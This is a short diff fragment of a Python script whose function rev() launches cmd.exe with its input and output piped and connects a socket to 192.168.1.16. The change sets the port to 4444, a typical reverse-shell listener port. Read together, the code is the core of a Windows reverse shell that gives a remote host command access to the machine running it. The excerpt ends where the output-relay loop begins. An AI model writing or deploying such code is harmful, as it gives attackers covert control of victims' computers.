@@ -7,7 +7,7 @@ import time
 def rev():
    p = sp.Popen(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)
    s = socket.socket()
-   s.connect(('192.168.1.16', 1))
+   s.connect(('192.168.1.16', 4444))
 
    def s_o():
        while True:
